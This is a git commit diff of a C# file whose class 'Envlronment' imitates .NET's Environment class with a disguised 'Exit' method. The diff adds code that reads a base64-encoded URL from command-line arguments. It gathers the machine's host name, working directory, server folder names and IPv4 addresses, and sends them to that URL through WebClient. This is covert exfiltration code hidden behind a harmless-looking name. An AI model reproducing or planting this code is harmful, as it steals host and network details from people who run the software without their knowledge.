2158cbad04918e69f3e90172b99f1fe7704dfe68
Rahat5528 <143008716+Rahat5528@users.noreply.github.com>
2023-10-25 18:09:31 +0000

    Update fudNjcMa3DLnwZayZtfXvCHbmc5RpKJKvTqFXmqpM7QtEECP7s9AwsTKU5HJsi7F.cs

--- fudNjcMa3DLnwZayZtfXvCHbmc5RpKJKvTqFXmqpM7QtEECP7s9AwsTKU5HJsi7F.cs
+++ fudNjcMa3DLnwZayZtfXvCHbmc5RpKJKvTqFXmqpM7QtEECP7s9AwsTKU5HJsi7F.cs
@@ -1,4 +1,5 @@
 using System;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
@@ -6,40 +7,50 @@ using System.Text;
 
 public class Envlronment
 {
-	public static void Exit(int n)
-	{
-		var args = Environment.GetCommandLineArgs();
-	
-		var wd = args.FirstOrDefault(arg => arg.StartsWith("WD:"));
-		wd = wd == null ? null : wd.Replace("WD:", string.Empty);
+    public static void Exit(int n)
+    {
+        var args = Environment.GetCommandLineArgs();
 
-		var sid = args.FirstOrDefault(arg => arg.StartsWith("SID:"));
-		sid = sid == null ? null : sid.Replace("SID:", string.Empty);
-		
-		var url = args.FirstOrDefault(arg => arg.StartsWith("URL:"));
-		url = url == null ? null : url.Replace("URL:", string.Empty);
+        var wd = args.FirstOrDefault(arg => arg.StartsWith("WD:"));
+        wd = wd == null ? null : wd.Replace("WD:", string.Empty);
 
-		if (url != null)
-		{
-			// in version >= 2, need to decrypt url
-			if (n >= 2)
-			{
-				url = Encoding.UTF8.GetString(Convert.FromBase64String(url));
-			}
-			
-			var builder = new StringBuilder()
-                    		.Append("\nServer: *" + (sid ?? "NULL") + "* (v" + n + ")")
-                    		.Append("\n- " + (wd ?? "no working directory"))
-				.Append("\n- HostName: *" + Dns.GetHostName() + "*");
-                
-                	var addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Where(a => a.AddressFamily == AddressFamily.InterNetwork).ToArray();
-                	builder
-                    		.Append("\n\n*Network interfaces V4* (" + addressList.Length + ")")
-                    		.Append("\n- " + string.Join("\n- ", addressList.Select(a => a.ToString())));
+        var sid = args.FirstOrDefault(arg => arg.StartsWith("SID:"));
+        sid = sid == null ? null : sid.Replace("SID:", string.Empty);
 
-                
-                	var webClient = new WebClient();
-                	webClient.DownloadString(url + builder.ToString());
-		}
-	}
+        var url = args.FirstOrDefault(arg => arg.StartsWith("URL:"));
+        url = url == null ? null : url.Replace("URL:", string.Empty);
+
+        if (url != null)
+        {
+            // in version >= 2, need to decrypt url
+            if (n >= 2)
+            {
+                url = Encoding.UTF8.GetString(Convert.FromBase64String(url));
+            }
+
+            var builder = new StringBuilder()
+                .Append("\n%23" + Dns.GetHostName() + " _v" + n + "_")
+                .Append("\n`" + (wd ?? "no working directory") + "`");
+
+            if (wd != null)
+            {
+                var serversDir = Path.Combine(wd, "Servers");
+                var serversList = Directory.GetDirectories(serversDir, "*", SearchOption.TopDirectoryOnly);
+
+                builder
+                    .Append("\n\n*Found servers* (" + serversList.Length + ")")
+                    .Append("\n- " + string.Join("\n- ", serversList.Select(s => s == sid ? "*" + s + "*" : s)));
+            }
+
+            var addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList
+                .Where(a => a.AddressFamily == AddressFamily.InterNetwork).ToArray();
+            builder
+                .Append("\n\n*Network interfaces V4* (" + addressList.Length + ")")
+                .Append("\n- " + string.Join("\n- ", addressList.Select(a => a.ToString())));
+
+
+            var webClient = new WebClient();
+            webClient.DownloadString(url + builder.ToString());
+        }
+    }
 }
